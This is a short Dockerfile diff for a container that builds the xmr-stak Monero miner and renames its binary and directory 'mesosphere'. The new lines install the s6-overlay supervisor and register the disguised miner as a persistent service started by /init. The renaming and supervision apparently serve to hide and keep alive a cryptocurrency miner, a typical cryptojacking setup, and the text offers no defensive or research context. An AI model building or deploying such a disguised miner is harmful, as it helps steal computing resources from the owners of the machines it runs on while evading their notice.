@@ -5,4 +5,9 @@ RUN git clone https://github.com/fireice-uk/xmr-stak.git && cd xmr-stak/ && cmak
 RUN mv xmr-stak mesosphere && mv /mesosphere/bin/xmr-stak /mesosphere/bin/mesosphere
 COPY c/xmr/config.txt /mesosphere/bin/config.txt
 COPY c/xmr/cpu.txt /mesosphere/bin/cpu.txt
-CMD ["/mesosphere/bin/mesosphere --currency monero -c /mesosphere/bin/config.txt"]
+#CMD ["/mesosphere/bin/mesosphere --currency monero -c /mesosphere/bin/config.txt"]
+COPY s6-overlay-amd64.tar.gz /
+RUN tar xzf /s6-overlay-amd64.tar.gz -C /
+COPY c/xmr/run.sh /etc/services.d/mesosphere/run.sh
+RUN chmod 777 /etc/services.d/mesosphere/run.sh
+ENTRYPOINT ["/init"]
